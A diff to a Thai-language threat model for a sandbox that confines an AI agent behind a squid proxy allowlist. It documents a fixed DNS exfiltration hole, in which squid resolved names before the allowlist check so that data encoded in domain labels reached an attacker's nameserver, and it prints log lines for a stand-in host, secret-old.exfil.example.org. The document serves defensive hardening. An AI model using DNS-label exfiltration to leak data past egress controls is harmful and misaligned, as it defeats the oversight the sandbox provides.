@@ -305,6 +305,24 @@ raw content การ front ไปหา origin ของผู้โจมต�
    egress ที่รู้จัก SNI (SNI proxy / L7 firewall) — เป็น **การตัดสินใจ** เพราะกระทบเส้น
    "ไม่ทำ SSL-bump" ใน §3.1 ไม่ใช่แค่แก้ config
 
+**ปิดแล้ว (session 12): DNS exfiltration ผ่าน proxy.** กฎ `http_access deny private_dst` (ACL ชนิด `dst`
+ที่ต้องรู้ IP ปลายทาง) เคยถูกประเมิน **ก่อน** allowlist squid จึง resolve ทุกชื่อที่ agent ส่งมาใน CONNECT
+แล้วค่อยตอบ 403 — ข้อมูลที่ใส่ไว้ใน label ของชื่อโดเมนจึงไปถึง nameserver ของผู้โจมตีได้ วัดด้วย squid จริง
++ DNS ปลอมที่บันทึกทุก query:
+
+```
+# ก่อนแก้: CONNECT secret-old.exfil.example.org:443
+TCP_DENIED/403 CONNECT secret-old.exfil.example.org:443        # squid access.log
+QUERY secret-old.exfil.example.org type 1 from 172.30.0.10     # nameserver ได้ข้อมูลไปแล้ว
+# หลังแก้: 403 เหมือนเดิม แต่ไม่มี query ของชื่อนี้เลย
+```
+
+ตอนนี้ `deny !allowed_domains` (จับชื่อ ไม่ resolve) มาก่อน `private_dst` ชื่อนอก allowlist จึงไม่ถูก resolve
+เลย ส่วนชื่อใน allowlist ที่ resolve เป็น IP ภายใน (DNS rebinding) ยังถูกปฏิเสธเหมือนเดิม ทดสอบด้วย phase L
+(ค่าที่วัดข้างบนมาจาก squid 6.13 ของ `ubuntu/squid` ใน session คลาวด์ — image จริงใช้ squid 5.7 ของ Debian
+ต้องรัน phase L บน image จริงก่อนออก tag) และ self-test 3b2 วัดว่า resolver ของ Docker (127.0.0.11) ในกรง
+ไม่ตอบชื่อภายนอก (Docker Engine 29.3 บน network `internal`: `SERVFAIL`; บน Docker Desktop ยังไม่ได้วัด)
+
 ### 4.3 โค้ดที่ agent เขียนแล้วเอาไปรันบนโฮสต์
 กรงคุ้มครองแค่ตอน agent รันอยู่ข้างใน `git diff` ก่อน merge เสมอ
 **บรรเทา:** ตั้ง pre-commit hook สแกน secret และ review diff ทุกครั้ง
